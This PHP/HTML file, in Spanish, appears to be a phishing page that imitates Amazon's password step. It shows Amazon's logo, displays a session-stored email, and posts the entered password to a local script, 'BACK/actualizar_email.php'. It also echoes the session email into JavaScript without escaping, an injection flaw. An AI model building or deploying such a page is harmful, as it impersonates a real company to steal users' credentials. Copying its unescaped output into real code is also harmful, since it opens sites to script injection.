<?php
session_start();
?>
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Amazon Login</title>
  <link rel="stylesheet" href="css/login2.css">
  <script>
    document.addEventListener("DOMContentLoaded", function() {
      var storedEmail = "<?php echo isset($_SESSION['email']) ? $_SESSION['email'] : 'correo@example.com'; ?>";
      var emailElement = document.querySelector(".email");
      emailElement.textContent = storedEmail;
      document.getElementById("hidden-email").value = storedEmail;
    });
  </script>
</head>
<body>
  <section class="flex1">
    <div class="logo">
        <img src="imagenes/logo2.png" alt="Amazon Logo"/>
    </div>
  </section>
  <div class="container">
    <h1>Iniciar sesión</h1>
    <div class="email-container">
      <span class="email"></span>
      <a href="login.html">Cambiar</a>
    </div>
    <div class="olvidaste">
      <a>Contraseña</a>
      <a href="">¿Olvidaste tu contraseña?</a>
    </div>
    <form action="BACK/actualizar_email.php" method="post">
      <div class="input-group">
        <input type="hidden" name="email" id="hidden-email">
        <input type="password" name="password" required>
      </div>
      <button type="submit">Iniciar sesión</button>
    </form>
    <div class="remember-me">
      <input type="checkbox" id="remember-me">
      <label for="remember-me">Recuérdame.</label>
      <a href="#" class="a-popover-trigger">Detalles</a>
    </div>
  </div>
</body>
</html>
